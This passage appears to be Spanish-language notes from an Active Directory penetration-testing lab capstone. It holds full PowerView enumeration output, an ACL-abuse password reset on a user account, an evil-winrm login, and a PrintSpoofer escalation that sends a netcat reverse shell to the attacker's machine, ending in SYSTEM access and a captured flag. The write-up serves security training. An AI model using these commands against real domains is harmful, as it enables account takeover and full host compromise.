IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-32-554
AccessMask            : 4
AuditFlags            : None
AceFlags              : ContainerInherit, Inherited
AceQualifier          : AccessAllowed

AceType               : AccessAllowed
ObjectDN              : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights : CreateChild, Self, WriteProperty, ExtendedRight, Delete, GenericRead, WriteDacl, WriteOwner
OpaqueLength          : 0
ObjectSID             : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags      : ContainerInherit
BinaryLength          : 24
IsInherited           : True
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-32-544
AccessMask            : 983485
AuditFlags            : None
AceFlags              : ContainerInherit, Inherited
AceQualifier          : AccessAllowed

PS C:\Users\stephanie> Get-DomainGPO


usncreated               : 5672
systemflags              : -1946157056
displayname              : Default Domain Policy
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EA
                           C-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00
                           C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
whenchanged              : 9/6/2022 8:52:34 PM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 24835
dscorepropagationdata    : {9/2/2022 11:10:49 PM, 1/1/1601 12:00:00 AM}
name                     : {31B2F340-016D-11D2-945F-00C04FB984F9}
flags                    : 0
cn                       : {31B2F340-016D-11D2-945F-00C04FB984F9}
iscriticalsystemobject   : True
gpcfilesyspath           : \\corp.com\sysvol\corp.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
distinguishedname        : CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=corp,DC=com
whencreated              : 9/2/2022 11:08:26 PM
versionnumber            : 11
instancetype             : 4
objectguid               : d6b50459-7ebf-434b-ac1f-56467f07f8cc
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=corp,DC=com

usncreated               : 5675
systemflags              : -1946157056
displayname              : Default Domain Controllers Policy
gpcmachineextensionnames : [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 9/2/2022 11:08:26 PM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 5675
dscorepropagationdata    : {9/2/2022 11:10:49 PM, 1/1/1601 12:00:00 AM}
name                     : {6AC1786C-016F-11D2-945F-00C04fB984F9}
flags                    : 0
cn                       : {6AC1786C-016F-11D2-945F-00C04fB984F9}
iscriticalsystemobject   : True
gpcfilesyspath           : \\corp.com\sysvol\corp.com\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
distinguishedname        : CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=corp,DC=com
whencreated              : 9/2/2022 11:08:26 PM
versionnumber            : 1
instancetype             : 4
objectguid               : da3266fb-ab4e-4961-8ed1-fe2b81a9548a
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=corp,DC=com

PS C:\Users\stephanie> Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft

IdentityReferenceName ActiveDirectoryRights             AceType ObjectDN
--------------------- ---------------------             ------- --------
DC1$                             GenericAll AccessAllowedObject CN=DFSR-LocalSettings,CN=DC1,OU=Domain Controllers,DC=cor...
DC1$                             GenericAll AccessAllowedObject CN=Domain System Volume,CN=DFSR-LocalSettings,CN=DC1,OU=D...
DC1$                             GenericAll AccessAllowedObject CN=SYSVOL Subscription,CN=Domain System Volume,CN=DFSR-Lo...
stephanie                        GenericAll       AccessAllowed CN=Management Department,DC=corp,DC=com
stephanie                        GenericAll       AccessAllowed CN=robert,CN=Users,DC=corp,DC=com

PS C:\Users\stephanie> Get-DomainUser robert


pwdlastset            : 7/2/2025 12:31:09 PM
usncreated            : 557211
lastlogoff            : 12/31/1600 4:00:00 PM
badpwdcount           : 0
name                  : robert
samaccounttype        : USER_OBJECT
samaccountname        : robert
whenchanged           : 7/2/2025 7:31:09 PM
objectsid             : S-1-5-21-1987370270-658905905-1781884369-22101
lastlogon             : 12/31/1600 4:00:00 PM
objectclass           : {top, person, organizationalPerson, user}
codepage              : 0
cn                    : robert
usnchanged            : 557228
primarygroupid        : 513
logoncount            : 0
countrycode           : 0
dscorepropagationdata : {7/2/2025 7:31:09 PM, 1/1/1601 12:00:00 AM}
useraccountcontrol    : NORMAL_ACCOUNT
accountexpires        : NEVER
distinguishedname     : CN=robert,CN=Users,DC=corp,DC=com
whencreated           : 7/2/2025 7:31:09 PM
badpasswordtime       : 12/31/1600 4:00:00 PM
instancetype          : 4
objectguid            : 11d80fc9-092d-4f26-a10e-fe98ce2744aa
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=com

```

#### Paso 2: Cambiamos credenciales de robert

* Vector:
Se encuentra que el usuario `robert` cae al el poder administrativo dentro del dominio por `stephanie`:
Resultados del comando `Find-InterestingDomainAcl`

Se procede por lo tanto a cambiarle la contrasena:

```powershell
Set-DomainUserPassword -Identity robert -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
```
> Es util en esta situacion donde podemos cambiar las credenciales de un usuario ver donde tiene sesiones activas.

* Exploitamos el privilegio para logearnos como **robert**
```powershell
PS C:\Users\stephanie> runas /user:CORP\robert cmd
Enter the password for CORP\robert:
Attempting to start cmd as user "CORP\robert" ...
```
* Revisamos host por host y encontramos:

```powershell
PS C:\Tools> Get-NetSession -ComputerName client74

CName        : \\192.168.234.75
UserName     : robert
Time         : 0
IdleTime     : 0
ComputerName : client74

PS C:\Tools> Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl

Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultS
         ecurity\
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : BUILTIN\Users Allow  ReadKey
         BUILTIN\Administrators Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         CREATOR OWNER Allow  FullControl
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow
         ReadKey
Audit  :
Sddl   : O:SYG:SYD:AI(A;CIID;KR;;;BU)(A;CIID;KA;;;BA)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;CO)(A;CIID;KR;;;AC)(A;CIID;KR;;;S-1
         -15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)
```

* Iniciamos sesion como robert en CLIENT74 y elevamos permisos administrador:
```bash
┌──(root㉿kali)-[/home/kali/OffSec/22-ActiveDirectory-Enumeration/Capstone]
└─# evil-winrm -i 192.168.234.74 -u 'robert' -p "NewPass123\!" -P 5985
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\robert\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled # CHAN!
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
*Evil-WinRM* PS C:\Users\robert\Documents> whoami /groups
                                                                                                                                                 
GROUP INFORMATION                                                                                                                                
-----------------                                                                                                                                
                                                                                                                                                 
Group Name                           Type             SID          Attributes                                                                    
==================================== ================ ============ ===============================================================               
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group                            
BUILTIN\Administrators               Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner               
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group                            
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group                            
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group                            
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group                            
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group                            
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                                               
*Evil-WinRM* PS C:\Users\robert\Documents> cd ..
*Evil-WinRM* PS C:\Users\robert> dir
                                                                                                                                                 
    Directory: C:\Users\robert

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---          7/3/2025   4:35 PM                Contacts
d-r---          7/3/2025   4:35 PM                Desktop
d-r---          7/3/2025   4:35 PM                Documents
d-r---          7/3/2025   4:35 PM                Downloads
d-r---          7/3/2025   4:35 PM                Favorites
d-r---          7/3/2025   4:35 PM                Links
d-r---          7/3/2025   4:35 PM                Music
d-r---          7/3/2025   4:36 PM                OneDrive
d-r---          7/3/2025   4:35 PM                Pictures
d-r---          7/3/2025   4:35 PM                Saved Games
d-r---          7/3/2025   4:35 PM                Searches
d-r---          7/3/2025   4:35 PM                Videos
-a----          7/3/2025   4:46 PM          59392 nc.exe
-a----          7/3/2025   4:42 PM          27136 ps.exe # PrintSpoofer64


*Evil-WinRM* PS C:\Users\robert> .\ps.exe -c "C:\Users\robert\nc.exe 192.168.45.213 1234 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
*Evil-WinRM* PS C:\Users\robert>

```

* En el receptor:
```bash
┌──(root㉿kali)-[/home/kali/OffSec/22-ActiveDirectory-Enumeration/Capstone]
└─# nc -lvnp 1234                   
listening on [any] 1234 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.234.74] 51128
Microsoft Windows [Version 10.0.22000.856]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>hostname
hostname
client74

C:\Users> powershell -ep bypass
PS C:\Users> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\administrator\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          7/4/2025   5:46 AM             78 proof.txt
PS C:\Users\administrator\Desktop> type proof.txt
type proof.txt
OS{dd3f4a6f69bdec445b7e4b7b83d7c37a}
PS C:\Users\administrator\Desktop>
```

## Troubleshooting
* Problemas con base de datos en bloodhound:
```bash
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/OffSec/22-ActiveDirectory-Enumeration/Capstone]
└─# pg_lsclusters

Ver Cluster Port Status Owner    Data directory              Log file
17  main    5432 down   postgres /var/lib/postgresql/17/main /var/log/postgresql/postgresql-17-main.log
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/OffSec/22-ActiveDirectory-Enumeration/Capstone]
└─# pg_ctlcluster 17 main start     
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/OffSec/22-ActiveDirectory-Enumeration/Capstone]
└─# pg_lsclusters              
Ver Cluster Port Status Owner    Data directory              Log file
17  main    5432 online postgres /var/lib/postgresql/17/main /var/log/postgresql/postgresql-17-main.log
                                                                                                                                                                                                              
```
* Ejecutar PrintSpoofer desde el directorio correcto
```powershell
C:\Users\robert
```
## Herramientas Alternativas
- [ ] **Herramienta 1:** Descripción breve (Comando)
- [ ] **Herramienta 2:** Descripción breve (Comando)
- [ ] **Herramienta 3:** Descripción breve (Comando)

